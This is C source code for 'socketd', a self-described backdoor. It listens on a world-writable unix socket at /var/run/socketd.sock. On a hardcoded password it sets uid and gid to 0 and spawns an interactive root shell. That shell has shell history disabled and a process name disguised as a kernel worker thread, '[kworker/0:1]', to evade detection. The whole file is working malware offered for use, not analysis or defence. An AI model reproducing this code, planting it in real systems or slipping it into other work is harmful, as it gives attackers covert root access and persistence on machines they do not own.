/*
 *  socketd
 *  a simple backdoor using a unix socket
 *
 *  @reptar_xl
 *  1 june 2016
 *
 *  https://github.com/raincoats/socketd
 *
*/

#define SOCKNAME  "/var/run/socketd.sock"
#define PASSWORD  "knock knock m0therfucker"
#define SLY_ARGV0 "[kworker/0:1]"


#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <stddef.h>
#include <errno.h>
#include <sys/un.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>

/*
 *  most of main() copy pasted from:
 *  http://www.binarytides.com/server-client-example-c-sockets-linux/
 *
 *  make_named_socket() copy pasted from:
 *  http://www.gnu.org/software/libc/manual/html_node/Local-Socket-Example.html
 *
 *  printy is from http://stackoverflow.com/questions/1644868/
 *
*/

#ifndef DEBUG
#define DEBUG 0
#endif

#define printy(fmt, ...) \
 do { if (DEBUG) fprintf(stderr, fmt, __VA_ARGS__); } while (0)

int
make_named_socket (const char *filename)
{
	struct sockaddr_un name;
	int sock;
	size_t size;

	/* Create the socket. */
	sock = socket(PF_LOCAL, SOCK_STREAM, 0);

	if (sock < 0){
		perror ("socket");
		exit (EXIT_FAILURE);
	}

	/* Bind a name to the socket. */
	name.sun_family = AF_LOCAL;
	strncpy (name.sun_path, filename, sizeof (name.sun_path));
	name.sun_path[sizeof (name.sun_path) - 1] = '\0';

	size = (offsetof (struct sockaddr_un, sun_path)
	        + strlen (name.sun_path));

	if (bind (sock, (struct sockaddr *) &name, size) < 0){
	perror ("make_named_socket(): bind()");
	exit (EXIT_FAILURE);
}
  return sock;
}



void h4ck_th3_pl4n3t(int client_sock)
{
	if (client_sock < 0){
		printy("fuck(): client_sock: is %d\n", client_sock);
		perror("accept failed");
		exit(1);
	}

	int read_size;
	char client_message[2000];

	setsid();
	dup2(client_sock, STDIN_FILENO);
	dup2(client_sock, STDOUT_FILENO);
	dup2(client_sock, STDERR_FILENO);

	while((read_size = recv(client_sock, client_message, 2000, 0)) > 0)
	{
		strtok(client_message, "\n");
		if (! strcmp(PASSWORD, client_message))
		{
			setuid(0);
			setgid(0);
			printf("[READY] uid=%d gid=%d\n", getuid(), getgid());

			char const *args[] = { SLY_ARGV0, "-i", NULL };
			char const *env[]  = { "HISTFILE=/dev/null", "SAVEHIST=",
			                       "PS1=\n[$(whoami)@$(hostname)]:$(pwd)\\$ ",
			                       "LANG=en_US.UTF-8", NULL };

			execve("/bin/sh", (char **)args, (char **)env);
		}
	}
	if(read_size == 0){
		puts("Client disconnected");
		fflush(stdout);
	}
	else if(read_size == -1){
		perror("recv failed");
		exit(1);
	}
	printy("closing client sock: %d: bye bye", client_sock);
	close(client_sock);
	exit(0);
}



int main(int argc , char *argv[])
{
	int socket_desc;
	char *sockname = SOCKNAME;
	int c = sizeof(struct sockaddr_un);
	unlink(sockname);

	int server = make_named_socket(sockname);
	chmod(sockname, 00666); // world writable ;)

	if (listen(server, 3) != 0) {
		perror("listen");
		exit(1);
	}

	while (1+1 == 2)
	{
		int pid;
		int newfd = dup(3);

		printy("main():      server: is %d\n", server);
		printy("main():       newfd: is %d\n", newfd);

		int client_sock = accept(newfd, (struct sockaddr *)&newfd,
			                     (socklen_t *)&c);
		printy("main(): client_sock: is %d\n", client_sock);

		if((pid = fork()) == -1){
			perror("fork failed");
			return 1;
			continue;
		}
		else if (pid == 0){
			h4ck_th3_pl4n3t(client_sock);
			break;
		}
		else{
			int status;
			printy("main(): had a baby called: pid %d\n", pid);
		}
	}
	close(server);
	unlink(sockname);
	return 0;
}